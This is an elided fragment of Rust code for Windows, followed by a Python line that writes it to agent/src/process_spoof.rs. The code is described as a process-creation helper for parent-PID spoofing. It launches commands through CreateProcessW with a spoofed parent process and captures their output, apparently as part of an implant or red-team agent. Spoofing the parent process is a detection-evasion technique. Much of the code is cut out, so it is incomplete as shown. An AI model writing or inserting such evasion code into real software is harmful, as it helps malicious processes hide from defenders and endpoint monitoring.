...
pub fn execute_command(program: &str, args: &[&str], capture_output: bool) -> Result<std::process::Output> {
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::processthreadsapi::{
        CreateProcessW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
        DeleteProcThreadAttributeList, PROCESS_INFORMATION,
    };
    use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, CREATE_NO_WINDOW, STARTUPINFOEXW};
    ...
    use winapi::um::winnt::STARTF_USESTDHANDLES;
    
    let parent_pid = crate::process_manager::get_spoof_parent_pid()
    ...
    unsafe {
        ...
        if capture_output {
            ...
            sec_attr.nLength = std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
        ...
        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(&cmd_str).encode_wide().chain(std::iter::once(0)).collect();
        ...
        if success == 0 {
            if !stdout_rd.is_null() { CloseHandle(stdout_rd); }
            return Err(anyhow::anyhow!("CreateProcessW failed with {}", std::io::Error::last_os_error()));
        }
        ...
        if capture_output && !stdout_rd.is_null() {
            ...
            loop {
                ...
                let ok = ReadFile(stdout_rd, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, std::ptr::null_mut());
...
with open("agent/src/process_spoof.rs", "w") as f:
    f.write("//! Process creation helper for PPID spoofing.\nuse anyhow::Result;\n")
    f.write(code)
